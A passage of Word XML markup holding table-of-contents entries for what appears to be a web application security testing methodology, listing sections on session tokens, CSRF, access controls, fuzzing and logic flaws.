              </w:rPr>
              <w:t>2.5.1</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Understand the Mechanism</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836585 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5C9A5B4D"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6" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5.2</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Tokens for Predictability</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836586 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="28AD77D5"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7" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5.3</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Check for Insecure Transmission of Tokens</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836587 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="21DAFE92"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8" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5.4</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Check for Disclosure of Tokens in Logs</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836588 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6964F8DC"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89" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5.5</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Check Mapping of Tokens to Sessions</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836589 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>15</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="61ABF73F"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0" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5.6</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test Session Termination</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836590 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1D39183C"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1" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5.7</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Check for Session Fixation</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836591 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3263824D"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2" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.5.8</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Check for CSRF</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836592 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="2E8A88E8"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93" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.6</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedure: Test Access Controls</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836593 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>16</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="13B30A52"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4" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.6.1</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Understand the Access Control Requirements</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836594 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="569F9DB1"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5" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.6.2</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Test for Insecure Access Control Methods</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836595 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="44716817"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96" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.7</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedure: Test for Input-Based Vulnerabilities</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836596 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4DB31D8F"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7" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.7.1</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Fuzz All Parameters</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836597 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>17</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6B81E3AB" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="00324BE7">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="880"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc58836598" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.8</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Procedure: Test For Logic Flaws</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836598 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>19</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="71080676"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599" w:history="1">
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.8.1</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F" w:rsidRPr="00DB7FEC">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Identify the Key Attack Surface</w:t>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc58836599 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="004C5A8F">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
